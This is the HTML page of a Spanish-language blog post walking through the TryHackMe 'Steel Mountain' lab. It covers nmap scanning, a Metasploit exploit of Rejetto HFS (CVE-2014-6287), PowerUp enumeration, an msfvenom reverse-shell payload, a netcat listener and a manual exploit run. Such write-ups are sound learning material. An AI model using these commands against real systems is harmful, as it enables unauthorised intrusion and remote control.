@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html class="" lang="en"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            Steel Mountain [TryHackMe]  &ndash;
+        
+        K3ssDev
+:/var/log$  
+    </title>
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://k3ssdev.github.io/css/styles.c5c0ca1ad04162d8cbbaa1291d7d0e5d96b9ad04a6b2b68c8ed577d7eabb970ab79d33477f3b13c760eed232f5f642bdcbce1f28bf3f057c36edf5e6c41d203c.css integrity="sha512-xcDKGtBBYtjLuqEpHX0OXZa5rQSmsraMjtV31&#43;q7lwq3nTNHfzsTx2Du0jL19kK9y84fKL8/BXw27fXmxB0gPA==" />
+<meta name="author" content="Alberto Pérez" />
+
+    
+        <meta name="keywords" content='“Meterpreter”, “Reverse Shell”, “Windows&#34;, Easy, Enumeration, HTTP Server, Metasploit, Privilege Escalation, Privilege Escalation, TryHackMe, WinPeas' />
+    
+    
+        <meta name="description" content="ountain es la tercera máquina de la serie &amp;ldquo;Offensive Pentesting&amp;rdquo; de TryHackMe. Es una sala fácil que tiene como objetivo aprender sobre escalada de privilegios en un entorno Windows comprometido. En esta máquina, se explora la explotación de una vulnerabilidad conocida en un servidor web, se obtiene acceso inicial, se explora la enumeración y finalmente se logra escalar privilegios para obtener control total sobre la máquina." />
+    
+
+<meta property="og:site_name"
+    content='K3ssDev
+:/var/log$  ' />
+
+    <meta property="og:title" content="Steel Mountain [TryHackMe]" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="Alberto Pérez" />
+    <meta
+        property="article:published_time"
+        content='2023-08-27T16:00:00Z&#43;0200' />
+    
+        
+            <meta property="article:tag" content="“Meterpreter”" />
+        
+            <meta property="article:tag" content="“Reverse Shell”" />
+        
+            <meta property="article:tag" content="“Windows&#34;" />
+        
+            <meta property="article:tag" content="Easy" />
+        
+            <meta property="article:tag" content="Enumeration" />
+        
+            <meta property="article:tag" content="HTTP Server" />
+        
+            <meta property="article:tag" content="Metasploit" />
+        
+            <meta property="article:tag" content="Privilege Escalation" />
+        
+            <meta property="article:tag" content="Privilege Escalation" />
+        
+            <meta property="article:tag" content="TryHackMe" />
+        
+            <meta property="article:tag" content="WinPeas" />
+        
+    
+    <meta property="og:url" content="https://k3ssdev.github.io/posts/stell-mountain/" />
+    <meta property="og:image"
+        content='https://k3ssdev.github.io/images/post_pics/steelmountain/steel_mountain.jpeg
+        ' />
+    
+        <meta property="og:description" content="Introducción Steel Mountain es la tercera máquina de la serie &amp;ldquo;Offensive Pentesting&amp;rdquo; de TryHackMe. Es una sala fácil que tiene como objetivo aprende" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='k3ssdev.github.io'
+/>
+<meta property="twitter:url" content="https://k3ssdev.github.io/posts/stell-mountain/" />
+
+
+    <meta name="twitter:title" content="Steel Mountain [TryHackMe]" />
+    
+    <meta name="twitter:image"
+        content='https://k3ssdev.github.io/images/post_pics/steelmountain/steel_mountain.jpeg
+        ' />
+    
+        <meta name="twitter:description" content="Introducción Steel Mountain es la tercera máquina de la serie &amp;ldquo;Offensive Pentesting&amp;rdquo; de TryHackMe. Es una sala fácil que tiene como objetivo aprende" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' />
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">K3ssDev
+:/var/log$  </a>
+                        
+                    </h1>
+                    
+                        <label id="hamburger-menu" for="main-nav-toggler">
+                            &#xf85b;
+                        </label>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="mailto:k3ssdev@proton.me">
+    
+    
+        &#xf6ed;
+    
+    <span>
+        Email
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://www.linkedin.com/in/alberto-perez-del-rio/">
+    
+    
+        &#xf0e1;
+    
+    <span>
+        Linkedin
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/k3ssdev">
+    
+    
+        &#xf09b;
+    
+    <span>
+        Github
+    </span>
+</a>
+
+    </div>
+    
+        <div id="sidebar_nav"><nav>
+    
+        <input type="checkbox" id="main-nav-toggler" />
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+            <li><a href="https://k3ssdev.github.io/pages/about/">
+                About
+            </a></li>
+        
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+            <li><a href="/search">Search</a></li>
+        
+    </ul>
+</nav>
+</div>
+        
+    
+<script src="https://tryhackme.com/badge/1277295"></script>
+
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>Steel Mountain [TryHackMe]</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2023-08-27
+
+</p>
+    
+    
+    
+        <figure style="margin: 0">
+            <img src="/images/post_pics/steelmountain/steel_mountain.jpeg" alt="" />
+            
+        </figure>
+    
+    
+    <div><h2 id="introducción">Introducción</h2>
+<p><strong>Steel Mountain</strong> es la tercera máquina de la serie &ldquo;Offensive Pentesting&rdquo; de TryHackMe. Es una sala fácil que tiene como objetivo aprender sobre escalada de privilegios en un entorno Windows comprometido. En esta máquina, se explora la explotación de una vulnerabilidad conocida en un servidor web, se obtiene acceso inicial, se explora la enumeración y finalmente se logra escalar privilegios para obtener control total sobre la máquina.</p>
+<h2 id="task-1---desplegar-la-máquina">Task 1 - Desplegar la máquina</h2>
+<h3 id="paso-1-desplegar-la-máquina">Paso 1: Desplegar la máquina</h3>
+<ul>
+<li>Accedo a la plataforma TryHackMe y despliego la máquina Steel Mountain.</li>
+</ul>
+<h2 id="task-2---acceso-inicial">Task 2 - Acceso Inicial</h2>
+<h3 id="paso-1-escaneo-de-puertos-con-nmap">Paso 1: Escaneo de Puertos con Nmap</h3>
+<ul>
+<li>
+<p>Realizo un escaneo de puertos en la máquina objetivo utilizando Nmap.</p>
+</li>
+<li>
+<p>Comandos utilizados:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sS --min-rate <span style="color:#ae81ff">5000</span> -p- 10.10.25.83 -Pn -v -oN nmap_inicial
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="paso-2-identificar-el-servidor-web-en-el-puerto-8080">Paso 2: Identificar el Servidor Web en el Puerto 8080</h3>
+<ul>
+<li>
+<p>Escaneo el servidor web en el puerto 8080 para obtener más información.</p>
+</li>
+<li>
+<p>Comandos utilizados:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p8080 -sC -sV 10.10.25.83 -Pn -oN nmap_final
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="paso-3-identificar-la-cve-para-el-servidor-httpfileserver">Paso 3: Identificar la CVE para el Servidor HttpFileServer</h3>
+<ul>
+<li>Busco sobre el servidor Rejetto en <em>Exploit-DB</em> y encuentro la CVE-2014-6287 asociada al servidor HttpFileServer 2.3.</li>
+</ul>
+<h3 id="paso-4-explotación-del-servidor-httpfileserver">Paso 4: Explotación del Servidor HttpFileServer</h3>
+<ul>
+<li>
+<p>Utilizo Metasploit para explotar la vulnerabilidad en el servidor Rejetto HttpFileServer.</p>
+</li>
+<li>
+<p>Comandos utilizados:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; use exploit/windows/http/rejetto_hfs_exec
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/http/rejetto_hfs_exec<span style="color:#f92672">)</span> &gt; set RHOSTS 10.10.25.83
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/http/rejetto_hfs_exec<span style="color:#f92672">)</span> &gt; set RPORT <span style="color:#ae81ff">8080</span>
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/http/rejetto_hfs_exec<span style="color:#f92672">)</span> &gt; set LHOST tun0
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>windows/http/rejetto_hfs_exec<span style="color:#f92672">)</span> &gt; run
+</span></span></code></pre></div></li>
+</ul>
+<h2 id="task-3---privilege-escalation">Task 3 - Privilege Escalation</h2>
+<h3 id="paso-1-enumerar-la-máquina-comprometida">Paso 1: Enumerar la Máquina Comprometida</h3>
+<ul>
+<li>Después de obtener acceso, realizo una enumeración inicial de la máquina comprometida.</li>
+</ul>
+<h3 id="paso-2-escalar-privilegios-como-usuario-bill">Paso 2: Escalar Privilegios como Usuario Bill</h3>
+<ul>
+<li>
+<p>Utilizo el script <strong>PowerUp.ps1</strong> para buscar vulnerabilidades de escalada de privilegios.</p>
+</li>
+<li>
+<p>Comandos utilizados:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>. .<span style="color:#ae81ff">\\</span>PowerUp.ps1
+</span></span><span style="display:flex;"><span>Invoke-AllChecks
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="paso-3-identificar-el-servicio-vulnerable">Paso 3: Identificar el Servicio Vulnerable</h3>
+<ul>
+<li>Examino la salida de PowerUp y encuentro información sobre el servicio vulnerable <em><strong>&ldquo;AdvancedSystemCareService9&rdquo;</strong></em>.</li>
+</ul>
+<h3 id="paso-4-generar-y-ejecutar-un-payload-malicioso">Paso 4: Generar y Ejecutar un Payload Malicioso</h3>
+<ul>
+<li>
+<p>Genero un payload con msfvenom y lo ejecuto en la máquina comprometida.</p>
+</li>
+<li>
+<p>Comandos utilizados:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>tu_IP LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4455</span> -f exe -o Advanced.exe
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="paso-5-resultado">Paso 5: Resultado</h3>
+<ul>
+<li>Con éxito, obtengo privilegios y gano acceso de administrador en la máquina comprometida.</li>
+</ul>
+<h2 id="task-4---access-and-escalation-without-metasploit">Task 4 - Access and Escalation Without Metasploit</h2>
+<h3 id="paso-41-descargar-el-exploit-y-ncatexe">Paso 4.1: Descargar el Exploit y ncat.exe</h3>
+<ul>
+<li>Descargo el exploit y <code>nc.exe</code> en mi máquina local.</li>
+</ul>
+<h3 id="paso-42-iniciar-un-servidor-http-en-mi-máquina-local">Paso 4.2: Iniciar un Servidor HTTP en mi Máquina Local</h3>
+<ul>
+<li>
+<p>Inicio un servidor HTTP en mi máquina local con python para servir los archivos necesarios a la máquina objetivo.</p>
+</li>
+<li>
+<p>Comandos utilizados:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="paso-43-preparar-un-listener-de-netcat">Paso 4.3: Preparar un Listener de Netcat</h3>
+<ul>
+<li>
+<p>Preparo un listener de Netcat en mi máquina local para recibir la conexión inversa desde la máquina objetivo.</p>
+</li>
+<li>
+<p>Comandos utilizados:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">1234</span>
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="paso-44-ejecutar-el-exploit-dos-veces-en-la-máquina-objetivo">Paso 4.4: Ejecutar el Exploit Dos Veces en la Máquina Objetivo</h3>
+<ul>
+<li>
+<p>Ejecuto el exploit dos veces contra la máquina objetivo para descargar <code>ncat.exe</code> y luego ejecuto el payload.</p>
+</li>
+<li>
+<p>Comandos utilizados:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo python2 exploit.py 10.10.192.191 <span style="color:#ae81ff">8080</span>
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="paso-45-obtener-una-conexión-inversa">Paso 4.5: Obtener una Conexión Inversa</h3>
+<ul>
+<li>Una vez que tengo una conexión inversa en mi listener, tengo acceso a la máquina objetivo como el usuario &ldquo;bill&rdquo; y ya puedo escalar privilegios como se hizo anteriormente.</li>
+</ul>
+<h2 id="conclusion">Conclusion</h2>
+<p>&ldquo;Steel Mountain&rdquo; ha sido una máquina bastante divertida con tématica de <strong>Mr. Robot</strong>, una gran serie sobre hacking que es especialmente realista en los detalles técnicos. En esta máquina, tenemos la oportunidad de aprender más sobre la explotación de una vulnerabilidad conocida en un servidor web en un entorno Windows, obtener acceso mediante una shell inversa y escalar privilegios para obtener control total sobre la máquina con Metasploit y Meterpreter, además de poder hacer lo mismo con un exploit personalizado sin utilizar Metasploit.</p>
+<h2 id="-hack-the-planet">(◕‿‿◕) Hack the planet!</h2>
+</div>
+</article>
+
+    
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/meterpreter">#“Meterpreter”</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/reverse-shell">#“Reverse Shell”</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/windows">#“Windows&#34;</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/easy">#Easy</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/enumeration">#Enumeration</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/http-server">#HTTP Server</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/metasploit">#Metasploit</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/privilege-escalation">#Privilege Escalation</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/privilege-escalation">#Privilege Escalation</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/tryhackme">#TryHackMe</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/winpeas">#WinPeas</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+
+<p><small>
+        2023 &copy; Licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution 4.0 International License</a>.
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
